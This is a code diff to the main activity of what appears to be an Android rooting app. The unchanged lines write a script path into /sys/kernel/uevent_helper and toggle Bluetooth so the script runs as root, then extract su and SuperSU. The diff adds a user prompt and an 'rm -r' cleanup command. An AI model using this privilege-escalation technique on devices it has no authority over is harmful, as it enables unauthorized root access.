@@ -34,6 +34,7 @@ import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.res.AssetManager;
 import android.os.Bundle;
+import android.widget.Toast;
 
 public class MainActivity extends Activity {
 
@@ -48,9 +49,13 @@ setContentView(R.layout.activity_main);
 	boolean stage2 = new File("/data/last_alog/onboot").exists();
 	
 	if (stage2) {
-		
+
+
 		//Write path to script to uevent_helper, so it is executed on hotplug event
 		exec("echo /data/last_alog/root.sh > /sys/kernel/uevent_helper");
+		
+
+		
 		
 		//Toggle bluetooth to cause hotplug event
 	    BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();    
@@ -60,8 +65,13 @@ setContentView(R.layout.activity_main);
 	        mBluetoothAdapter.disable(); 
 	    } 
 	    
+		//Because bluetooth toggle wasnt working on one particular device
+		Toast toast = Toast.makeText(this, "Please turn your screen on and off, wait for reboot", Toast.LENGTH_SHORT);
+		toast.show();
+	    
 	} else {
-
+		//clean up
+		exec("rm -r /data/last_alog/*");
 		//Dump resources to /data/last_alog
 		extractAsset("su", "/data/last_alog/su", this);
 		extractAsset("supersu.apk", "/data/last_alog/supersu.apk", this);
